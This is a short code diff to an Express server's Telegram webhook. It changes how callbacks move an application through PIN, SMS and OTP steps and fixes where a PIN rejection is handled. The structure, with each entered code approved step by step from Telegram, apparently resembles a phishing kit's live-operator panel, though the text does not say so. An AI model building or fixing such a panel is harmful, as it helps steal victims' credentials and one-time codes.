@@ -163,7 +163,9 @@ app.post('/telegram-webhook', async (req, res) => {
     const appId = parts.slice(2).join('_');
 
     if (applications[appId]) {
-      if (type === 'auth') {
+      if (type === 'auth' && action === 'reject') {
+        applications[appId].status = 'PIN_REJECTED';
+      } else if (type === 'auth') {
         applications[appId].status = (action === 'approve') ? 'SMS_STEP' : 'PIN_REJECTED';
       } else if (type === 'sms') {
         applications[appId].status = (action === 'approve') ? 'OTP_STEP' : 'SMS_REJECTED';
@@ -171,12 +173,7 @@ app.post('/telegram-webhook', async (req, res) => {
         if (action === 'approve') {
           applications[appId].status = 'APPROVED';
         } else {
-          // Checks if the callback data corresponds to the wrong pin action triggered from the final step (auth_reject)
-          if (type === 'auth' && action === 'reject') {
-            applications[appId].status = 'PIN_REJECTED';
-          } else {
-            applications[appId].status = 'OTP_REJECTED';
-          }
+          applications[appId].status = 'OTP_REJECTED';
         }
       }
     }
@@ -201,4 +198,4 @@ app.post('/telegram-webhook', async (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-                               
+         
